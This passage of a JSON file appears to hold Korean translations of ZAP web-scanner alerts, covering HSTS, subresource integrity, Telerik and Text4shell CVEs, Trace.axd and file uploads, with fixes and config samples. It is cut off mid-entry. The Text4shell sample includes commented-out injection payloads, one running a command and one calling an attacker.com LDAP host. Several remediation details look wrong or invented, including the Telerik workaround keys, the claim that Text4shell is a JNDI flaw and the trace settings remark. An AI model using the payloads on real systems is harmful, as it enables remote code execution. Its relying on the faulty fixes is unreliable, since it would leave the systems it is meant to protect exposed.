    "example_code_http_headers": "Cache-Control: public, max-age=31536000\nContent-Type: image/jpeg\nETag: \"abcdef12345\"\n\nCache-Control: no-store, no-cache, must-revalidate, proxy-revalidate\nPragma: no-cache\nExpires: 0\nVary: Cookie, Authorization\n    "
  },
  "Storable but Non-Cacheable Content": {
    "translated": "저장은 가능하지만 캐시는 불가능한 콘텐츠 – 웹 캐시나 저장소에 저장될 수는 있지만 캐시되지 않는 콘텐츠가 감지됨",
    "description": "응답 헤더에 `Cache-Control: no-cache` 또는 `Cache-Control: must-revalidate`와 같은 지시어가 포함되어 있어 콘텐츠가 저장될 수는 있지만, 재확인 없이는 캐시를 사용해서는 안 됨을 나타냅니다. 이는 민감하지 않은 동적 콘텐츠에 적합할 수 있습니다.",
    "solution_guidelines": [
      "**의도된 캐싱 정책 확인:** 이 상태가 애플리케이션의 의도된 캐싱 정책인지 확인합니다. 민감하지 않으면서도 최신 데이터를 보여줘야 하는 경우 (예: 뉴스 피드), 이 설정이 적절할 수 있습니다.",
      "**민감한 정보 확인:** 응답에 민감한 정보가 포함되어 있지 않은지 다시 확인합니다. 만약 민감한 정보가 있다면 `Cache-Control: no-store`를 추가하여 저장 자체를 금지해야 합니다.",
      "**`Vary` 헤더 적절히 사용:** 콘텐츠가 요청 헤더(예: `Cookie`, `Authorization`, `Accept-Language`)에 따라 달라지는 경우, `Vary` 헤더를 적절히 설정하여 잘못된 캐싱을 방지합니다."
    ],
    "example_code_http_headers": "Cache-Control: no-cache, must-revalidate\nPragma: no-cache\nExpires: 0\nVary: Accept-Encoding\n    "
  },
  "Strict-Transport-Security Defined via META (Non-compliant with Spec)": {
    "translated": "Strict-Transport-Security 메타 태그 정의 (비표준) – HSTS(HTTP Strict Transport Security)가 HTML 메타 태그로 정의되어 있어 웹 표준에 부합하지 않고 효과가 제한적임",
    "description": "`Strict-Transport-Security` (HSTS) 정책이 HTTP 응답 헤더가 아닌 HTML `<meta>` 태그를 통해 정의되어 있음을 나타냅니다. HSTS는 보안을 강화하기 위해 HTTP 응답 헤더로만 지정되어야 합니다. `<meta>` 태그는 브라우저에 의해 무시되므로 HSTS 보호가 제공되지 않습니다.",
    "solution_guidelines": [
      "**HSTS를 HTTP 응답 헤더로 설정:** `Strict-Transport-Security` 헤더는 반드시 웹 서버 또는 애플리케이션 레벨에서 HTTP 응답 헤더로 설정해야 합니다. `<meta>` 태그에 정의된 HSTS는 제거합니다.",
      "**HTTPS 전용 통신 보장:** HSTS는 클라이언트가 해당 도메인에 HTTPS로만 접속하도록 강제합니다. 따라서 모든 HTTP 요청을 HTTPS로 리다이렉션해야 합니다.",
      "**`max-age` 및 `includeSubDomains` 설정:** `max-age` 값을 충분히 길게 설정하고 (`31536000`초, 즉 1년 이상 권장), 서브 도메인에도 적용하려면 `includeSubDomains` 지시어를 추가합니다.",
      "**HSTS Preload 고려:** HSTS Preload 리스트에 도메인을 등록하여 브라우저가 첫 방문부터 HTTPS로만 접속하도록 할 수 있습니다. 단, 이는 되돌리기 어려우므로 신중하게 결정해야 합니다."
    ],
    "example_code_http_header_and_removal": "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    "example_code_nginx": "# Nginx 설정 예시\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;",
    "example_code_apache": "# Apache httpd.conf 또는 .htaccess 예시\n<IfModule mod_headers.c>\n    Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"\n</IfModule>"
  },
  "Strict-Transport-Security Disabled": {
    "translated": "Strict-Transport-Security 비활성화됨 – HSTS(HTTPS 강제 적용)가 비활성화되어 HTTPS로의 자동 리다이렉션이 강제되지 않음",
    "description": "`Strict-Transport-Security` (HSTS) 헤더가 웹 서버 응답에 존재하지 않거나, `max-age` 값이 0으로 설정되어 사실상 비활성화되어 있음을 나타냅니다. 이는 사용자가 HTTP를 통해 접속할 때 중간자 공격(MITM)에 취약해질 수 있습니다.",
    "solution_guidelines": [
      "**HSTS 헤더 설정:** `Strict-Transport-Security` 헤더를 모든 HTTPS 응답에 추가합니다.",
      "**`max-age` 값 설정:** `max-age`를 충분히 길게 설정합니다 (최소 1년 이상인 `31536000`초를 권장).",
      "**`includeSubDomains` 설정:** 서브 도메인까지 HSTS 정책을 적용하려면 `includeSubDomains` 지시어를 추가합니다.",
      "**`preload` 지시어 고려:** HSTS Preload 리스트에 등록하여 브라우저에 HSTS 정책을 미리 알릴 수 있습니다. (매우 신중하게 접근)",
      "**HTTP to HTTPS 리다이렉션:** 모든 HTTP 요청은 301 (Moved Permanently) 리다이렉션을 사용하여 HTTPS로 강제 전환해야 합니다."
    ],
    "example_code_nginx": "# Nginx 설정 예시 (HTTP에서 HTTPS로 리다이렉션 후 HSTS 헤더 추가)\nserver {\n    listen 80;\n    server_name yourdomain.com www.yourdomain.com;\n    return 301 https://$host$request_uri;\n}\n\nserver {\n    listen 443 ssl;\n    server_name yourdomain.com www.yourdomain.com;\n    # SSL/TLS 설정...\n    \n    # HSTS 헤더 추가\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n    \n    # ... 나머지 설정\n}"
  },
  "Strict-Transport-Security Header": {
    "translated": "Strict-Transport-Security 헤더 – HSTS(HTTPS 강제 적용) 헤더가 설정되어 있는지 확인",
    "description": "`Strict-Transport-Security` (HSTS) HTTP 응답 헤더가 존재하며, 이는 브라우저에게 해당 도메인에 앞으로는 HTTPS를 통해서만 접속하도록 지시하여 중간자 공격으로부터 보호합니다. 이는 긍정적인 보안 지표입니다.",
    "solution_guidelines": [
      "**`max-age` 값 최적화:** `max-age` 값을 충분히 길게 설정했는지 확인합니다 (최소 1년 권장). 너무 짧으면 효과가 미미하고, 너무 길면 되돌리기 어렵습니다.",
      "**`includeSubDomains` 적용 범위 확인:** 모든 서브 도메인에 HTTPS를 적용할 준비가 되었다면 `includeSubDomains` 지시어를 포함합니다.",
      "**`preload` 적용 고려:** HSTS Preload 리스트에 도메인을 등록하여 브라우저가 첫 방문부터 HTTPS로만 접속하도록 할 수 있습니다. 모든 서브 도메인이 HTTPS를 완벽히 지원하는지 확인 후 신중하게 진행합니다.",
      "**일관된 적용:** 모든 HTTPS 응답에 HSTS 헤더가 일관되게 적용되는지 확인합니다."
    ],
    "example_code_http_header": "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
  },
  "Strict-Transport-Security Header Not Set": {
    "translated": "Strict-Transport-Security 헤더 미설정 – HSTS(HTTPS 강제 적용) 헤더가 설정되지 않아 HTTPS로의 자동 리다이렉션이 강제되지 않음",
    "description": "`Strict-Transport-Security` (HSTS) HTTP 응답 헤더가 전혀 설정되어 있지 않음을 나타냅니다. 이는 사용자가 해당 도메인에 HTTPS를 통해 접속할 때 처음에는 HTTP로 연결 시도할 수 있어 중간자 공격에 취약해질 수 있습니다.",
    "solution_guidelines": [
      "**HSTS 헤더 설정:** 웹 서버 또는 애플리케이션에서 `Strict-Transport-Security` 헤더를 모든 HTTPS 응답에 추가합니다.",
      "**HTTPS로 강제 전환:** 모든 HTTP 요청은 HTTPS로 301 리다이렉션되도록 설정합니다. 이는 HSTS 정책이 브라우저에 처음으로 설정되기 전에 발생할 수 있는 공격을 방지합니다.",
      "**권장되는 HSTS 설정 적용:** `max-age`를 31536000 이상으로 설정하고, `includeSubDomains` 및 `preload` 지시어를 필요에 따라 추가합니다."
    ],
    "example_code_nginx": "# Nginx 설정 예시 (HTTPS server 블록 내)\nserver {\n    listen 443 ssl;\n    # ... SSL/TLS 설정 ...\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n    # ...\n}\n\n# HTTP에서 HTTPS로의 리다이렉션\nserver {\n    listen 80;\n    server_name example.com;\n    return 301 https://$host$request_uri;\n}"
  },
  "Strict-Transport-Security Header on Plain HTTP Response": {
    "translated": "Strict-Transport-Security 헤더 일반 HTTP 응답에 포함 – HSTS 헤더가 일반 HTTP 응답에 포함되어 있어 실제 보안 효과가 없음 (HTTPS 응답에 포함되어야 함)",
    "description": "`Strict-Transport-Security` (HSTS) 헤더가 암호화되지 않은 일반 HTTP 응답에 포함되어 있음을 나타냅니다. HSTS 헤더는 **반드시 HTTPS 응답에서만 제공되어야 합니다.** HTTP 응답에 포함될 경우, 헤더 자체를 변조하여 잘못된 HSTS 정책을 클라이언트에 주입할 수 있는 위험이 있습니다.",
    "solution_guidelines": [
      "**HSTS 헤더는 HTTPS 응답에서만 제공:** 웹 서버 또는 애플리케이션 설정을 검토하여 `Strict-Transport-Security` 헤더가 오직 HTTPS 트래픽에 대해서만 전송되도록 합니다.",
      "**HTTP to HTTPS 리다이렉션만 수행:** HTTP 포트에서는 HSTS 헤더를 보내지 않고, 오직 301 (Moved Permanently) 리다이렉션만을 통해 클라이언트를 HTTPS로 전환합니다.",
      "**웹 서버 설정 검토:** 특히 `add_header`와 같은 지시어가 특정 `server` 블록이나 `location` 블록에 제한되어 HTTPS 연결에만 적용되는지 확인합니다."
    ],
    "example_code_nginx_correct": "# Nginx 설정 예시 (HTTP는 리다이렉션만, HSTS는 HTTPS에서만)\nserver {\n    listen 80;\n    server_name yourdomain.com;\n    return 301 https://$host$request_uri; # HTTP에서는 HSTS 헤더 없음\n}\n\nserver {\n    listen 443 ssl;\n    server_name yourdomain.com;\n    # ... SSL/TLS 설정 ...\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always; # HTTPS에서만 HSTS 헤더 추가\n    # ...\n}"
  },
  "Strict-Transport-Security Malformed Content (Non-compliant with Spec)": {
    "translated": "Strict-Transport-Security 잘못된 내용 (비표준) – HSTS 헤더의 내용이 표준에 맞지 않아 제대로 동작하지 않을 수 있음",
    "description": "`Strict-Transport-Security` 헤더의 `content` 값(지시어)이 HTTP Strict Transport Security (HSTS) 사양에 맞지 않게 잘못 구성되어 있음을 나타냅니다. 이는 브라우저가 HSTS 정책을 제대로 적용하지 못하게 하여 보안 무효화를 초래합니다.",
    "solution_guidelines": [
      "**HSTS 헤더 구문 정확히 준수:** `Strict-Transport-Security` 헤더의 값은 `max-age=<seconds>; [includeSubDomains]; [preload]` 형식으로 정확하게 작성해야 합니다. `max-age`는 필수이며, `includeSubDomains`와 `preload`는 선택적 지시어입니다.",
      "**올바른 `max-age` 값 사용:** `max-age`는 양의 정수(초 단위)여야 합니다.",
      "**오타 및 불필요한 공백 확인:** 헤더 값 내에 오타나 사양에 맞지 않는 불필요한 공백, 문자가 없는지 확인합니다.",
      "**웹 서버/애플리케이션 설정 검토:** HSTS 헤더를 설정하는 웹 서버 구성 파일 또는 애플리케이션 코드에서 구문 오류를 수정합니다."
    ],
    "example_code_http_header_correct": "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
  },
  "Strict-Transport-Security Max-Age Malformed (Non-compliant with Spec)": {
    "translated": "Strict-Transport-Security Max-Age 잘못됨 (비표준) – HSTS 'max-age' 값이 잘못 설정됨",
    "description": "`Strict-Transport-Security` 헤더의 `max-age` 지시어 값이 HSTS 사양에 맞지 않게 잘못 구성되어 있음을 나타냅니다. `max-age`는 양의 정수(초 단위)여야 합니다. 잘못된 값은 HSTS 정책이 제대로 적용되지 못하게 합니다.",
    "solution_guidelines": [
      "**올바른 `max-age` 값 설정:** `max-age`는 반드시 양의 정수(초 단위)로 설정해야 합니다. 예를 들어, 1년은 `31536000`입니다. `0`은 HSTS 정책을 삭제하는 데 사용되지만, 이 경우는 비활성화로 간주됩니다.",
      "**웹 서버/애플리케이션 설정 검토:** `max-age` 값을 설정하는 웹 서버 구성 파일 또는 애플리케이션 코드에서 숫자 형식, 오타 등을 확인하고 수정합니다."
    ],
    "example_code_http_header_correct_maxage": "Strict-Transport-Security: max-age=31536000",
    "example_code_nginx": "# Nginx 설정 예시\nadd_header Strict-Transport-Security \"max-age=31536000\" always;"
  },
  "Strict-Transport-Security Missing Max-Age (Non-compliant with Spec)": {
    "translated": "Strict-Transport-Security Max-Age 누락됨 (비표준) – HSTS 'max-age' 값이 누락됨",
    "description": "`Strict-Transport-Security` 헤더에 필수 지시어인 `max-age`가 누락되어 있음을 나타냅니다. `max-age` 지시어가 없으면 HSTS 정책이 유효하지 않아 브라우저가 HSTS를 적용하지 않습니다.",
    "solution_guidelines": [
      "**`max-age` 지시어 반드시 포함:** `Strict-Transport-Security` 헤더를 설정할 때 `max-age` 지시어를 항상 포함해야 합니다. 이 지시어는 HSTS 정책이 적용될 기간을 초 단위로 명시합니다.",
      "**웹 서버/애플리케이션 설정 검토:** HSTS 헤더를 설정하는 웹 서버 구성 파일 또는 애플리케이션 코드에서 `max-age` 지시어가 올바르게 포함되었는지 확인하고 추가합니다."
    ],
    "example_code_http_header_correct_maxage_missing": "Strict-Transport-Security: max-age=31536000; includeSubDomains"
  },
  "Strict-Transport-Security Multiple Header Entries (Non-compliant with Spec)": {
    "translated": "Strict-Transport-Security 다중 헤더 항목 (비표준) – HSTS 헤더가 여러 번 설정되어 있어 브라우저별로 다르게 해석될 수 있음",
    "description": "HTTP 응답에 `Strict-Transport-Security` 헤더가 여러 번 나타나고 있음을 나타냅니다. HSTS 사양에 따르면 이 헤더는 응답당 한 번만 존재해야 합니다. 여러 번 존재하면 브라우저가 어떤 정책을 적용해야 할지 혼란을 겪거나, 가장 마지막 헤더만 적용하는 등 예상치 못한 동작을 할 수 있습니다.",
    "solution_guidelines": [
      "**HSTS 헤더 중복 제거:** 웹 서버 설정(Apache, Nginx 등) 또는 애플리케이션 코드에서 `Strict-Transport-Security` 헤더가 중복으로 추가되지 않도록 합니다. 일반적으로 단일 설정 지점에서만 이 헤더를 설정해야 합니다.",
      "**WAS/프록시 설정 검토:** WAS와 웹 서버(리버스 프록시) 모두에서 HSTS를 설정했을 수 있으므로, 중복 설정을 찾아 하나만 유지하도록 합니다."
    ],
    "example_code_nginx_apache_avoid_duplicates": "# Nginx 예시 (하나의 위치에서만 추가)\n# http 블록 또는 server 블록에서 한 번만 add_header를 사용합니다.\n# add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\n\n# Apache 예시 (하나의 위치에서만 추가)\n# Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\n\n# 애플리케이션 코드에서 헤더를 추가하는 경우에도 중복되지 않도록 주의"
  },
  "Sub Resource Integrity Attribute Missing": {
    "translated": "Sub Resource Integrity 속성 누락 – HTML <script> 또는 <link> 태그에 'integrity' 속성이 없어 외부 스크립트/스타일시트의 무결성 검증이 불가능함",
    "description": "외부에서 로드되는 스크립트(`script`) 또는 스타일시트(`link`) 태그에 `integrity` 속성(Subresource Integrity, SRI)이 누락되어 있음을 나타냅니다. SRI가 없으면 CDN(콘텐츠 전송 네트워크)이 손상되어 악성 콘텐츠가 주입되더라도 브라우저가 이를 감지하지 못하고 실행할 수 있습니다.",
    "solution_guidelines": [
      "**`integrity` 속성 추가:** 모든 외부 자원(특히 스크립트와 스타일시트)을 로드하는 `<script>` 및 `<link>` 태그에 `integrity` 속성을 추가합니다.",
      "**`crossorigin` 속성 사용:** `integrity` 속성을 사용할 때는 `crossorigin` 속성도 함께 사용하여 CORS(Cross-Origin Resource Sharing)를 활성화해야 합니다.",
      "**해시 값 생성 도구 사용:** SRI 해시 값(예: `sha256-`, `sha384-`)은 자원의 실제 내용을 기반으로 생성됩니다. 빌드 도구, SRI Generator 웹사이트 등을 사용하여 올바른 해시 값을 생성합니다.",
      "**지속적인 해시 값 업데이트:** 외부 자원이 업데이트될 때마다 `integrity` 해시 값도 함께 업데이트해야 합니다."
    ],
    "example_code_html": "<script src=\"https://example.com/cdn/my-script.js\"\n         integrity=\"sha384-oqVuAfXRKaEPUK5hX5mRj7d2E5q/Q5QxGjD4iY/rK6p1ZkRjQn4qC/F6K7L7K7D8\"\n         crossorigin=\"anonymous\"></script>\n\n<link rel=\"stylesheet\" href=\"https://example.com/cdn/my-styles.css\"\n      integrity=\"sha384-wvfXpqpZZVQGK6SpmtN/1vE/W+E/xO9NqA2g6B3g5H5C9P0B0G6T3eE8/W+Y/F6K7\"\n      crossorigin=\"anonymous\">"
  },
  "Tech Detection Passive Scanner": {
    "translated": "기술 감지 수동 스캐너 – 웹 기술 감지기가 수동 스캔으로 동작함",
    "description": "ZAP의 'Tech Detection Passive Scanner'는 웹 애플리케이션에서 사용되는 기술 스택(예: 프로그래밍 언어, 프레임워크, 웹 서버 등)을 식별했음을 나타내는 정보성 알림입니다. 이는 직접적인 취약점이 아니며, 공격자가 정보를 수집하는 데 사용될 수 있는 메타데이터로 볼 수 있습니다.",
    "solution_guidelines": [
      "**정보 노출 최소화:** 웹 서버 헤더(예: `X-Powered-By`, `Server`), 오류 메시지, 메타데이터 등을 통해 불필요한 기술 스택 정보가 노출되지 않도록 설정합니다.",
      "**버전 정보 숨기기:** 가능한 경우, 소프트웨어의 정확한 버전 번호 노출을 숨깁니다. (예: `Server: Apache` 대신 `Server: WebServer`)",
      "**패치 및 업데이트:** 사용 중인 모든 기술 스택(웹 서버, 프레임워크, 라이브러리)을 항상 최신 보안 패치가 적용된 버전으로 유지합니다. 기술 정보가 노출되더라도, 알려진 취약점에 대해 패치되어 있다면 공격 성공률을 낮출 수 있습니다."
    ],
    "example_code_general": "(This is an informational alert. Solutions are focused on minimizing the exposed information, as detailed in other related alerts like \"Server Leaks Information via 'X-Powered-By'\" or \"Server Leaks Version Information via 'Server'\".)"
  },
  "Telerik UI for ASP.NET AJAX Cryptographic Weakness (CVE-2017-9248)": {
    "translated": "Telerik UI for ASP.NET AJAX 암호화 약점 (CVE-2017-9248) – Telerik UI 컴포넌트의 암호화 약점으로 인해 데이터 유출이나 원격 코드 실행이 가능할 수 있음",
    "description": "Telerik UI for ASP.NET AJAX 라이브러리의 심각한 암호화 취약점(CVE-2017-9248)이 탐지되었습니다. 이 취약점은 `RadAsyncUpload` 컨트롤의 취약한 암호화 구현으로 인해 원격 코드 실행(RCE)을 허용할 수 있습니다.",
    "solution_guidelines": [
      "**Telerik UI for ASP.NET AJAX 업데이트:** 가장 중요하며 즉각적인 해결책은 Telerik UI for ASP.NET AJAX 라이브러리를 취약점이 패치된 최신 버전(2017.2.621 이상)으로 즉시 업데이트하는 것입니다.",
      "**워크어라운드 적용 (임시 방편):** 업데이트가 즉시 어려운 경우, 다음 워크어라운드를 적용할 수 있습니다. (이는 임시 방편이며, 업데이트가 필수적입니다.)\n    * `Telerik.Web.UI.dll`의 `EnableEmbeddedBaseStylesheet` 및 `EnableEmbeddedScripts` 속성을 `false`로 설정합니다.\n    * `Telerik.Web.UI.WebResource.axd` 핸들러에 대해 URL Rewrite 규칙을 적용하여 특정 취약한 기능에 대한 접근을 제한합니다.\n    * 웹 방화벽(WAF)을 사용하여 해당 공격 패턴을 차단하는 규칙을 적용합니다.",
      "**불필요한 기능 비활성화:** `RadAsyncUpload` 컨트롤을 사용하지 않는다면, 애플리케이션에서 해당 컨트롤의 사용을 제거하거나 비활성화합니다."
    ],
    "example_code_aspnet_web_config_workaround": "<appSettings>\n    <add key=\"Telerik.Web.UI.EnableEmbeddedBaseStylesheet\" value=\"false\" />\n    <add key=\"Telerik.Web.UI.EnableEmbeddedScripts\" value=\"false\" />\n</appSettings>\n\n<system.webServer>\n  <rewrite>\n    <rules>\n      <rule name=\"Block Telerik CVE-2017-9248 Exploit\" stopProcessing=\"true\">\n        <match url=\".*WebResource.axd.*\" />\n        <conditions logicalGrouping=\"MatchAll\" trackAllCaptures=\"false\">\n          <add input=\"{QUERY_STRING}\" pattern=\"^d=[a-zA-Z0-9%]+&amp;t=[a-zA-Z0-9%]+&amp;type=rau.*\" />\n        </conditions>\n        <action type=\"CustomResponse\" statusCode=\"403\" statusReason=\"Forbidden\" statusDescription=\"Forbidden\" />\n      </rule>\n    </rules>\n  </rewrite>\n</system.webServer>"
  },
  "Text4shell (CVE-2022-42889)": {
    "translated": "Text4shell (CVE-2022-42889) – Apache Commons Text 라이브러리의 원격 코드 실행 취약점",
    "description": "Apache Commons Text 라이브러리의 `StringSubstitutor` 클래스에서 발생하는 취약점(CVE-2022-42889)으로, 특정 패턴의 문자열을 처리할 때 JNDI Lookup을 통해 원격 코드 실행(RCE)이 가능해지는 심각한 취약점입니다.",
    "solution_guidelines": [
      "**Apache Commons Text 업데이트:** 가장 중요하며 우선적인 해결책은 Apache Commons Text 라이브러리를 취약점이 패치된 버전(1.10.0 이상)으로 즉시 업데이트하는 것입니다.",
      "**입력값 유효성 검사:** 외부에서 들어오는 모든 입력(특히 사용자 입력, 환경 변수 등)에 대해 엄격한 유효성 검사를 수행하여 `${­` 또는 `${prefix:name}`과 같은 특수 패턴이 포함되지 않도록 합니다.",
      "**JNDI Lookup 비활성화 (보조):** `StringSubstitutor`를 사용할 때 JNDI Lookup을 비활성화하는 옵션이 있다면 이를 활용합니다 (하지만 라이브러리 업데이트가 가장 확실한 방법입니다).",
      "**웹 방화벽(WAF) 규칙 적용:** 웹 방화벽을 사용하여 Text4shell 공격 시도에 대한 시그니처 기반 규칙을 적용하여 공격을 차단합니다."
    ],
    "example_code_java_mitigation": "// Java 코드 예시 (Apache Commons Text 1.10.0 이상으로 업데이트가 가장 중요)\n\n// StringSubstitutor 사용 시 (업데이트된 라이브러리 사용 시 안전)\nimport org.apache.commons.text.StringSubstitutor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Text4ShellPrevention {\n    public static void main(String[] args) {\n        Map<String, String> valueMap = new HashMap<>();\n        valueMap.put(\"name\", \"World\");\n\n        // 안전한 StringSubstitutor 사용 (업데이트된 라이브러리에서 기본적으로 JNDI Lookup 비활성화)\n        StringSubstitutor sub = new StringSubstitutor(valueMap);\n        String template = \"Hello, ${name}!\";\n        String result = sub.replace(template);\n        System.out.println(result);\n\n        // 취약한 패턴 예시 (업데이트된 라이브러리에서는 작동하지 않음)\n        // String vulnerableTemplate = \"${script:javascript:java.lang.Runtime.getRuntime().exec('calc.exe')}\";\n        // String vulnerableTemplate = \"${dns:ldap://attacker.com/a}\";\n        // result = sub.replace(vulnerableTemplate);\n        // System.out.println(result);\n    }\n}",
    "example_code_maven_gradle": "<dependency>\n    <groupId>org.apache.commons</groupId>\n    <artifactId>commons-text</artifactId>\n    <version>1.10.0</version> </dependency>\n\n// Gradle build.gradle 예시\ndependencies {\n    implementation 'org.apache.commons:commons-text:1.10.0' // 1.10.0 이상 버전으로 업데이트\n}"
  },
  "Timestamp Disclosure - Unix": {
    "translated": "타임스탬프 노출 - Unix – Unix 타임스탬프(Epoch time)가 노출되어 시간 기반 공격의 힌트를 제공하거나 정보 유출에 사용될 수 있음",
    "description": "응답에 Unix 타임스탬프(Epoch Time)가 포함되어 있음을 나타냅니다. 이는 정보성 알림이며, 이 자체로 취약점은 아니지만, 타임스탬프가 민감한 이벤트(예: 로그인 실패, 계정 생성)와 연관되어 노출될 경우, 공격자가 시스템 내부 정보(예: 시스템의 정확한 시간, 이벤트 발생 주기)를 유추하는 데 사용될 수 있습니다.",
    "solution_guidelines": [
      "**불필요한 타임스탬프 제거:** 사용자에게 노출될 필요가 없는 타임스탬프는 제거하거나, 일반적인 날짜/시간 형식으로 변환하여 노출합니다.",
      "**오류 메시지 및 로그 정보 최소화:** 오류 메시지나 응답 본문에 포함된 디버깅 정보에서 불필요한 타임스탬프를 제거합니다.",
      "**타임스탬프의 문맥 확인:** 타임스탬프가 노출되더라도 그것이 민감한 정보와 연관되어 공격에 악용될 가능성이 있는지 검토합니다."
    ],
    "example_code_general": "(This is an informational alert. Solution is to review where timestamps are used and whether they provide unnecessary information.)\n\n// Example: Displaying a formatted date instead of raw Unix timestamp\n// Java\n// import java.time.Instant;\n// import java.time.LocalDateTime;\n// import java.time.ZoneId;\n// import java.time.format.DateTimeFormatter;\n//\n// long unixTimestamp = 1678886400L; // Example timestamp\n// LocalDateTime dateTime = LocalDateTime.ofInstant(Instant.ofEpochSecond(unixTimestamp), ZoneId.systemDefault());\n// String formattedDate = dateTime.format(DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\"));\n// System.out.println(formattedDate); // 2023-03-15 09:00:00\n\n// Python\n# import datetime\n#\n# unix_timestamp = 1678886400\n# dt_object = datetime.datetime.fromtimestamp(unix_timestamp)\n# formatted_date = dt_object.strftime(\"%Y-%m-%d %H:%M:%S\")\n# print(formatted_date) # 2023-03-15 09:00:00"
  },
  "Trace.axd Information Leak": {
    "translated": "Trace.axd 정보 유출 – ASP.NET의 'trace.axd' 파일이 노출되어 요청/응답 정보, 세션 데이터 등 상세한 디버그 정보가 유출될 수 있음",
    "description": "ASP.NET 애플리케이션에서 `Trace.axd` 디버깅 페이지가 활성화되어 있어 애플리케이션의 내부 동작, 세션 정보, 요청/응답 헤더, 오류 메시지 등 민감한 디버깅 정보가 외부에 노출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**`trace` 비활성화:** 프로덕션 환경에서는 `web.config` 파일에서 `<trace>` 요소를 `enabled=\"false\"`로 설정하여 `Trace.axd` 기능을 완전히 비활성화합니다.",
      "**`remoteOnly` 설정:** 개발 환경에서 디버깅 목적으로 `trace` 기능을 사용해야 한다면, `localOnly=\"true\"` 또는 `remoteOnly=\"true\"` (현재 `remoteOnly=\"true\"`는 더 이상 사용되지 않고 `localOnly=\"true\"` 권장)를 설정하여 로컬 호스트에서만 접근 가능하도록 제한합니다.",
      "**불필요한 핸들러 제거:** `web.config`에서 `TraceHandler`와 관련된 `<add name=\"TraceHandler\" path=\"trace.axd\" verb=\"*\" type=\"System.Web.Handlers.TraceHandler\" />` 항목을 제거합니다.",
      "**웹 서버 접근 제어:** 웹 서버(IIS) 수준에서 `trace.axd` 파일에 대한 접근을 제한합니다."
    ],
    "example_code_aspnet_web_config": "<system.web>\n    <trace enabled=\"false\" requestLimit=\"10\" pageOutput=\"false\" traceMode=\"SortByTime\" localOnly=\"true\" />\n</system.web>\n\n<system.webServer>\n  <handlers>\n    <remove name=\"TraceHandler\" />\n  </handlers>\n</system.webServer>"
  },
  "Upload Form Discovered": {
    "translated": "업로드 폼 발견 – 파일을 업로드할 수 있는 폼이 발견됨 (웹 셸 업로드 등 심각한 취약점으로 이어질 수 있음)",
    "description": "ZAP이 웹 애플리케이션에서 파일 업로드 양식을 발견했음을 나타내는 정보성 알림입니다. 파일 업로드 기능 자체는 취약점이 아니지만, 이 기능은 악성 파일 업로드, 웹 쉘 업로드, 서비스 거부 등 다양한 공격에 악용될 수 있으므로 철저한 보안 검토가 필요합니다.",
    "solution_guidelines": [
      "**파일 형식(MIME 타입) 엄격하게 검증:** 서버 측에서 업로드된 파일의 MIME 타입(Content-Type)을 화이트리스트 방식으로 검증하여 허용된 형식의 파일만 업로드되도록 합니다. 클라이언트 측 검증은 우회될 수 있습니다.",
      "**파일 확장자 검증:** 파일 확장자 또한 서버 측에서 화이트리스트 방식으로 검증합니다. `.php`, `.asp`, `.jsp`, `.exe` 등 실행 가능한 확장자 업로드를 금지합니다.",
      "**파일 이름 보안 처리:** 업로드된 파일 이름을 직접 사용하지 않고, 서버에서 안전한 고유 이름으로 변경합니다. 경로 조작 문자(예: `..`, `/`, `\\`)를 필터링합니다.",
      "**업로드 디렉토리 접근 제어:** 업로드된 파일이 저장되는 디렉토리는 웹 서버에서 직접 실행될 수 없도록 권한을 설정하고, 웹 루트 외부에 위치시키는 것을 고려합니다.",
      "**파일 크기 제한:** 업로드 가능한 파일의 최대 크기를 제한하여 서비스 거부 공격을 방지합니다.",
      "**안티바이러스 스캔:** 업로드된 파일을 서버에 저장하기 전에 안티바이러스 솔루션으로 스캔하는 것을 고려합니다.",
      "**이미지 파일 유효성 검사:** 이미지 파일의 경우, 실제 이미지 형식인지 확인하고, 이미지 처리 라이브러리를 사용하여 유효성을 검증하고 다시 저장합니다 (metadata 제거)."
    ],
    "example_code_php_upload_secure": "<?php\n// PHP Secure File Upload Example\nif ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['uploadFile'])) {\n    $targetDir = \"uploads/\"; // 웹 루트 외부 또는 실행 권한이 없는 디렉토리로 설정 권장\n    $fileName = basename($_FILES[\"uploadFile\"][\"name\"]);\n    $targetFilePath = $targetDir . $fileName;\n    $fileType = strtolower(pathinfo($targetFilePath, PATHINFO_EXTENSION));\n\n    // 1. 파일 크기 제한\n    $maxFileSize = 5 * 1024 * 1024; // 5MB\n    if ($_FILES[\"uploadFile\"][\"size\"] > $maxFileSize) {\n        die(\"File is too large.\");\n    }\n\n    // 2. 파일 형식(MIME Type) 및 확장자 화이트리스트\n    $allowedFileTypes = ['jpg', 'png', 'gif', 'pdf'];\n    $allowedMimeTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];\n\n    $uploadedMimeType = mime_content_type($_FILES['uploadFile']['tmp_name']); // 실제 MIME 타입\n    \n    if (!in_array($fileType, $allowedFileTypes) || !in_array($uploadedMimeType, $allowedMimeTypes)) {\n        die(\"Invalid file type or extension. Only JPG, PNG, GIF, PDF are allowed.\");\n    }\n\n    // 3. 파일 이름 보안 처리 및 고유 이름 생성\n    $safeFileName = uniqid() . \".\" . $fileType;\n    $finalFilePath = $targetDir . $safeFileName;\n\n    // 4. 업로드 디렉토리 존재 여부 및 권한 확인\n    if (!is_dir($targetDir) || !is_writable($targetDir)) {\n        die(\"Upload directory is not writable or does not exist.\");\n    }\n\n    if (move_uploaded_file($_FILES[\"uploadFile\"][\"tmp_name\"], $finalFilePath)) {\n        echo \"File uploaded successfully: \" . htmlspecialchars($safeFileName);\n    } else {\n        echo \"Error uploading file.\";\n    }\n} else {\n    echo \"\n    <form action=\"\" method=\"post\" enctype=\"multipart/form-data\">\n        Select file to upload:\n        <input type=\"file\" name=\"uploadFile\" id=\"uploadFile\">\n        <input type=\"submit\" value=\"Upload 